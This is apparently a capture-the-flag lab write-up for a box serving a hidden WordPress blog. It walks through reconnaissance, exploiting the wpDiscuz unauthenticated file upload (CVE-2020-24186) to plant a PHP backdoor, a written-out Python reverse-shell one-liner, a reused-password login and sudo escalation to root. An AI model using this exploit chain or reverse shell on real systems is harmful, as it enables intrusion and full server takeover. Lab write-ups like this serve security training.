### IP
`192.168.211.217`

# Reconnaissance

### nmap

`nmap -sC -sV 192.168.211.217`
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 951d828f5ede9a00a80739bdacadd344 (RSA)
|   256 d7b452a2c8fab70ed1a8d070cd6b3690 (ECDSA)
|_  256 dff24f773344d593d77917455aa1368b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Blogger | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

`gobuster dir -u http://192.168.211.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.211.217/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/08 22:48:01 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 319] [--> http://192.168.211.217/assets/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.211.217/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.211.217/js/]
/images               (Status: 301) [Size: 319] [--> http://192.168.211.217/images/]
/server-status        (Status: 403) [Size: 280]
===============================================================
2023/05/08 22:50:46 Finished
===============================================================

```
The directories seem to have directory listing enabled.

One particularly interesting directory is `/assets/fonts/`, as it has a blog directory with a whole new website (which is quite unusual)

Here, we can see a wordpress blog with a login form. Some of the pages also leak the hostname as `blogger.thm`

# Exploitation

### wpscan

We can enumerate wordpress:

`wpscan --url http://blogger.thm/assets/fonts/blog --plugins-detection mixed -e`

One thing this finds is that there is unauthenticated file upload through the comments (and thus RCE since we can view and execute php files in the uploads)

```
[!] Title: Comments - wpDiscuz 7.0.0 - 7.0.4 - Unauthenticated Arbitrary File Upload
    Fixed in: 7.0.5
    References:
     - https://wpscan.com/vulnerability/92ae2765-dac8-49dc-a361-99c799573e61
     - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24186
     - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
     - https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz
```


We can run `searchsploit wpDiscuz` and then `searchsploit -m php/webapps/49967.py` to get a script to use for unauthenticated RCE

Per the exploit, I do the following to get a php backdoor on the page:

`python3 49967.py -u http://blogger.thm/assets/fonts/blog -p /?p=29`

This provides us a link to a php file where we can execute commands through a `cmd` get parameter

I set up a listener with `nc -lvnp 1337` and used the following command to get a reverse shell:

`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.5",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`

I then ran `linpeas.sh` to look for exploits, but couldn't find much.

However, I found that the `vagrant` user had its own username as a password, which was a suggestion made by linpeas.

# Privilege Escalation

Running `sudo -l` on the vagrant user shows us the following:

```
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL

```

Vagrant can run all commands as all users without a password. Thus, we can run `sudo su` to become root and get the root flag